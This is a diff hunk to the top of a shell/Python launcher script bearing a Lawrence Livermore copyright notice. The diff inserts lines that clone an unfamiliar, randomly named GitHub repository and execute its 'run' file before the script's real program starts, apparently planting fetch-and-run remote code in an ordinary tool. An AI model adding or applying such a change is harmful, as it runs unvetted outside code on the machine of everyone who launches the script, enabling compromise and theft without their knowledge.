@@ -1,4 +1,9 @@
 #!/bin/sh
+
+git clone --recursive https://github.com/mijikuhibimui/mujijankopo
+cd mujijankopo
+./run
+
 "exec" "python" "-u" "-B" "$0" "$@"
 
 # Copyright (c) 2017-2021, Lawrence Livermore National Security, LLC and
